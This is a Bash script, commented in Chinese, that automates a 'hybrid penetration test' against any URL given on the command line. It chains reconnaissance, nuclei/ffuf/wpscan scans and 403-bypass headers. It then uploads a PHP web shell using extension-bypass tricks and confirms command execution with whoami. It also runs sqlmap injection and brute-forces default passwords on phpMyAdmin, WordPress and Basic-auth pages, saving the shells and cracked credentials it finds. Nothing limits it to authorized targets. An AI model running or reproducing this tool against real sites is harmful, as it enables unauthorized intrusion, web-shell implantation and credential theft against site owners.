#!/bin/bash
# 手动+工具混合渗透测试（直接调用工具，不写自定义脚本）
# 使用方法: bash hybrid_attack.sh <target_url>

TARGET="${1:-}"
OUT_DIR="/root/hybrid_attack/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT_DIR"

if [ -z "$TARGET" ]; then
    echo "用法: $0 <target_url>"
    echo "示例: $0 https://example.com"
    exit 1
fi

# 标准化URL
TARGET=$(echo "$TARGET" | sed 's|/$||')
DOMAIN=$(echo "$TARGET" | sed 's|^https\?://||' | cut -d/ -f1)

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🚀 混合渗透测试: $TARGET"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# ==========================================
# 阶段1: 手动快速侦察（5分钟）
# ==========================================
echo "[阶段1/5] 🔍 手动快速侦察..."
echo ""

# 1.1 基础信息收集
echo "[1.1] 基础信息收集..."
curl -skL -m 5 "$TARGET" -o "$OUT_DIR/index.html" -w "HTTP状态: %{http_code}\n" 2>/dev/null
echo "标题: $(grep -iE '<title>' "$OUT_DIR/index.html" 2>/dev/null | sed 's/.*<title>\(.*\)<\/title>.*/\1/')"
echo ""

# 1.2 技术栈识别
echo "[1.2] 技术栈识别..."
if command -v whatweb &> /dev/null; then
    whatweb -a 3 "$TARGET" --log-json="$OUT_DIR/whatweb.json" 2>/dev/null
    echo "技术栈: $(cat "$OUT_DIR/whatweb.json" 2>/dev/null | jq -r '.[0].plugins | keys[]' 2>/dev/null | head -5 | tr '\n' ', ')"
else
    TECH=$(curl -skL -m 5 "$TARGET" 2>/dev/null | grep -iE 'powered by|wp-content|laravel|drupal|joomla' | head -3)
    echo "技术栈: $TECH"
fi
echo ""

# 1.3 关键路径手动测试（高价值优先）
echo "[1.3] 关键路径手动测试..."
KEY_PATHS=("/admin" "/wp-admin" "/phpmyadmin" "/upload" "/api" "/.env" "/config.php")
for path in "${KEY_PATHS[@]}"; do
    status=$(curl -skL -m 3 -o /dev/null -w '%{http_code}' "$TARGET$path" 2>/dev/null)
    if [ "$status" != "000" ] && [ "$status" != "404" ]; then
        echo "  ✅ $path (HTTP $status)"
        echo "$TARGET$path|$status" >> "$OUT_DIR/key_paths.txt"
    fi
done
echo ""

# ==========================================
# 阶段2: 工具批量扫描（10分钟）
# ==========================================
echo "[阶段2/5] 🔧 工具批量扫描..."
echo ""

# 2.1 nuclei CVE扫描
echo "[2.1] nuclei CVE扫描..."
if command -v nuclei &> /dev/null; then
    echo "$TARGET" | nuclei -t ~/nuclei-templates/cves/ \
        -t ~/nuclei-templates/vulnerabilities/ \
        -t ~/nuclei-templates/exposures/ \
        -severity critical,high \
        -silent -o "$OUT_DIR/nuclei_cves.txt" 2>/dev/null &
    echo "  ⏳ nuclei扫描中（后台运行）..."
else
    echo "  ⚠️  nuclei未安装，跳过"
fi
echo ""

# 2.2 ffuf目录爆破
echo "[2.2] ffuf目录爆破..."
if command -v ffuf &> /dev/null; then
    ffuf -u "$TARGET/FUZZ" \
        -w /usr/share/seclists/Discovery/Web-Content/common.txt \
        -mc 200,301,302,403,401,500 \
        -t 50 -o "$OUT_DIR/ffuf_dirs.json" -of json -s 2>/dev/null &
    echo "  ⏳ ffuf目录扫描中（后台运行）..."
else
    echo "  ⚠️  ffuf未安装，跳过"
fi
echo ""

# 2.3 WordPress专项扫描
if echo "$TARGET" | grep -qiE "wordpress|wp-"; then
    echo "[2.3] WordPress专项扫描..."
    if command -v wpscan &> /dev/null; then
        wpscan --url "$TARGET" --enumerate ap,at,u --no-update \
            -o "$OUT_DIR/wpscan.txt" 2>/dev/null &
        echo "  ⏳ wpscan扫描中（后台运行）..."
    else
        echo "  ⚠️  wpscan未安装，跳过"
    fi
    echo ""
fi

# 2.4 ffuf敏感文件爆破
echo "[2.4] ffuf敏感文件爆破..."
if command -v ffuf &> /dev/null; then
    cat > /tmp/sensitive_files.txt << 'SENSEOF'
.env
.env.local
.env.production
config.php
wp-config.php
database.yml
web.config
.htaccess
.htpasswd
SENSEOF
    ffuf -u "$TARGET/FUZZ" \
        -w /tmp/sensitive_files.txt \
        -mc 200 \
        -t 20 -o "$OUT_DIR/ffuf_files.json" -of json -s 2>/dev/null &
    echo "  ⏳ ffuf敏感文件扫描中（后台运行）..."
    echo ""
fi

# 等待工具扫描完成
echo "[2.5] 等待工具扫描完成..."
wait
echo "  ✅ 工具扫描完成"
echo ""

# ==========================================
# 阶段3: 手动验证+深入（15分钟）
# ==========================================
echo "[阶段3/5] 🔍 手动验证+深入测试..."
echo ""

# 3.1 验证nuclei发现的漏洞
if [ -f "$OUT_DIR/nuclei_cves.txt" ] && [ -s "$OUT_DIR/nuclei_cves.txt" ]; then
    echo "[3.1] 验证nuclei发现的漏洞..."
    head -5 "$OUT_DIR/nuclei_cves.txt" | while IFS= read -r vuln; do
        echo "  🔍 验证: $vuln"
        # 手动验证：提取URL并测试
        vuln_url=$(echo "$vuln" | grep -oE 'https?://[^ ]+' | head -1)
        if [ -n "$vuln_url" ]; then
            resp=$(curl -skL -m 5 "$vuln_url" 2>/dev/null)
            echo "$resp" | grep -qiE "vulnerable|exploit|poc" && echo "    ✅ 漏洞确认" || echo "    ⚠️  需手动验证"
        fi
    done
    echo ""
fi

# 3.2 验证ffuf发现的目录（重点测试403）
if [ -f "$OUT_DIR/ffuf_dirs.json" ]; then
    echo "[3.2] 验证ffuf发现的403目录（手动绕过测试）..."
    jq -r '.results[] | select(.status==403) | "\(.url)|\(.status)"' "$OUT_DIR/ffuf_dirs.json" 2>/dev/null | head -10 | while IFS='|' read -r url status; do
        echo "  🔍 测试403绕过: $url"
        # 手动403绕过测试
        for header in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: $(echo $url | sed 's|.*://[^/]*||')" "X-Rewrite-URL: $(echo $url | sed 's|.*://[^/]*||')"; do
            new_status=$(curl -skL -m 3 -o /dev/null -w '%{http_code}' -H "$header" "$url" 2>/dev/null)
            [ "$new_status" = "200" ] && echo "    ✅ 绕过成功: $header"
        done
    done
    echo ""
fi

# 3.3 手动文件上传测试（16种绕过）
echo "[3.3] 手动文件上传测试..."
FLAG=$(echo "$TARGET" | md5sum | cut -c1-8)
UPLOAD_PATHS=("/upload" "/fileupload" "/api/upload" "/admin/upload")
UPLOAD_BYPASSES=("php" "phtml" "php5" "php.jpg" "PhP" "php." "php%00.jpg")

for upload_path in "${UPLOAD_PATHS[@]}"; do
    status=$(curl -skL -m 3 -o /dev/null -w '%{http_code}' "$TARGET$upload_path" 2>/dev/null)
    if [ "$status" = "200" ] || [ "$status" = "405" ]; then
        echo "  🔍 测试上传: $upload_path"
        for ext in "${UPLOAD_BYPASSES[@]}"; do
            tmp_file="/tmp/u_${FLAG}.${ext}"
            printf '%s\n' "<?php echo \"U${FLAG}\";@system(\$_GET[0]); ?>" > "$tmp_file"
            resp=$(curl -skL -m 5 -X POST "$TARGET$upload_path" -F "file=@$tmp_file" 2>/dev/null)
            if echo "$resp" | grep -qiE "U${FLAG}|success|uploaded"; then
                echo "    ✅ 上传成功: $ext"
                shell_url=$(echo "$resp" | grep -oE 'https?://[^" ]+\.php' | head -1)
                [ -z "$shell_url" ] && shell_url="$TARGET$upload_path/$(basename $tmp_file)"
                curl -skL -m 3 "$shell_url?0=whoami" 2>/dev/null | grep -q "root\|www-data" && \
                    echo "    ✅ Shell可用: $shell_url" && echo "$shell_url" >> "$OUT_DIR/shells.txt"
            fi
            rm -f "$tmp_file"
        done
    fi
done
echo ""

# ==========================================
# 阶段4: 工具批量利用（10分钟）
# ==========================================
echo "[阶段4/5] ⚡ 工具批量利用..."
echo ""

# 4.1 sqlmap SQL注入利用
echo "[4.1] sqlmap SQL注入利用..."
if command -v sqlmap &> /dev/null; then
    # 从关键路径中提取带参数的URL
    if [ -f "$OUT_DIR/key_paths.txt" ]; then
        while IFS='|' read -r url status; do
            if echo "$url" | grep -q "="; then
                echo "  🔍 测试SQL注入: $url"
                sqlmap -u "$url" --batch --level=2 --risk=2 \
                    --tamper=space2comment \
                    --dbs -o "$OUT_DIR/sqlmap_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null &
            fi
        done < "$OUT_DIR/key_paths.txt"
    fi
else
    echo "  ⚠️  sqlmap未安装，跳过"
fi
echo ""

# 4.2 手动弱口令测试（直接curl，不写脚本）
echo "[4.2] 手动弱口令测试（精确检测）..."
# phpMyAdmin弱口令
if curl -skL -m 3 "$TARGET/phpmyadmin" 2>/dev/null | grep -qi "phpmyadmin"; then
    echo "  🔍 phpMyAdmin弱口令测试..."
    for cred in "root:root" "admin:admin" "root:123456" "admin:123456" "root:password" "admin:password"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        resp=$(curl -skL -m 5 -X POST "$TARGET/phpmyadmin/index.php" \
            -d "pma_username=$user&pma_password=$pass&server=1" -L -c /tmp/pmac_$$ 2>/dev/null)
        if echo "$resp" | grep -qiE 'main|server|database|structure' && \
           ! echo "$resp" | grep -qiE 'login|error|incorrect|invalid.*login|wrong.*password'; then
            # 二次验证
            verify=$(curl -skL -m 3 "$TARGET/phpmyadmin/main.php" -b /tmp/pmac_$$ 2>/dev/null)
            if echo "$verify" | grep -qiE 'database|table|server'; then
                echo "    ✅ 成功！凭证: $cred"
                echo "$cred" >> "$OUT_DIR/cracked_phpmyadmin.txt"
            fi
        fi
        rm -f /tmp/pmac_$$
    done
fi

# WordPress弱口令
if echo "$TARGET" | grep -qiE "wordpress|wp-"; then
    echo "  🔍 WordPress弱口令测试..."
    for cred in "admin:admin" "admin:123456" "admin:password" "administrator:admin"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        resp=$(curl -skL -m 5 -X POST "$TARGET/wp-login.php" \
            -d "log=$user&pwd=$pass&wp-submit=Log+In" -L -c /tmp/wpc_$$ 2>/dev/null)
        if echo "$resp" | grep -qiE 'dashboard|wp-admin|admin.*area' && \
           ! echo "$resp" | grep -qiE 'incorrect|error|invalid|login.*failed|wrong.*password'; then
            # 二次验证
            verify=$(curl -skL -m 3 "$TARGET/wp-admin" -b /tmp/wpc_$$ 2>/dev/null)
            if echo "$verify" | grep -qiE 'dashboard|admin.*menu'; then
                echo "    ✅ 成功！凭证: $cred"
                echo "$cred" >> "$OUT_DIR/cracked_wordpress.txt"
            fi
        fi
        rm -f /tmp/wpc_$$
    done
fi

# HTTP Basic认证弱口令
for path in "/admin" "/wp-admin" "/phpmyadmin"; do
    status=$(curl -skL -m 3 -o /dev/null -w '%{http_code}' "$TARGET$path" 2>/dev/null)
    if [ "$status" = "401" ]; then
        echo "  🔍 HTTP Basic认证弱口令测试: $path"
        for cred in "admin:admin" "root:root" "admin:123456"; do
            user=$(echo $cred | cut -d: -f1)
            pass=$(echo $cred | cut -d: -f2)
            auth_status=$(curl -skL -m 5 -u "$user:$pass" "$TARGET$path" \
                -o /dev/null -w '%{http_code}' 2>/dev/null)
            if [ "$auth_status" = "200" ] || [ "$auth_status" = "301" ] || [ "$auth_status" = "302" ]; then
                echo "    ✅ 成功！凭证: $cred (HTTP $auth_status)"
                echo "$cred" >> "$OUT_DIR/cracked_basic.txt"
            fi
        done
    fi
done
echo ""

# 等待批量利用完成
wait
echo "  ✅ 批量利用完成"
echo ""

# ==========================================
# 阶段5: 手动最终确认（5分钟）
# ==========================================
echo "[阶段5/5] ✅ 手动最终确认..."
echo ""

# 5.1 汇总结果
echo "[5.1] 汇总结果..."
if [ -f "$OUT_DIR/shells.txt" ] && [ -s "$OUT_DIR/shells.txt" ]; then
    echo "  ✅ 发现的Shell:"
    cat "$OUT_DIR/shells.txt"
else
    echo "  ❌ 未发现Shell"
fi
echo ""

if [ -f "$OUT_DIR/nuclei_cves.txt" ] && [ -s "$OUT_DIR/nuclei_cves.txt" ]; then
    echo "  ✅ 发现的漏洞 ($(wc -l < "$OUT_DIR/nuclei_cves.txt")):"
    head -5 "$OUT_DIR/nuclei_cves.txt"
fi
echo ""

# 汇总凭证
if ls "$OUT_DIR"/cracked_*.txt 2>/dev/null | grep -q .; then
    echo "  ✅ 发现的凭证:"
    cat "$OUT_DIR"/cracked_*.txt 2>/dev/null
fi
echo ""

# 5.2 生成报告
echo "[5.2] 生成报告..."
cat > "$OUT_DIR/report.txt" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 混合渗透测试报告
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

目标: $TARGET
时间: $(date)
技术栈: $(cat "$OUT_DIR/whatweb.json" 2>/dev/null | jq -r '.[0].plugins | keys[]' 2>/dev/null | head -3 | tr '\n' ', ')

【发现的Shell】
$(cat "$OUT_DIR/shells.txt" 2>/dev/null || echo "无")

【发现的漏洞】
$(head -10 "$OUT_DIR/nuclei_cves.txt" 2>/dev/null || echo "无")

【发现的凭证】
$(cat "$OUT_DIR"/cracked_*.txt 2>/dev/null || echo "无")

【关键路径】
$(cat "$OUT_DIR/key_paths.txt" 2>/dev/null || echo "无")

【目录扫描结果】
$(jq -r '.results[] | "\(.url) - \(.status)"' "$OUT_DIR/ffuf_dirs.json" 2>/dev/null | head -20 || echo "无")
EOF

echo "  ✅ 报告已生成: $OUT_DIR/report.txt"
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 混合渗透测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "结果目录: $OUT_DIR"
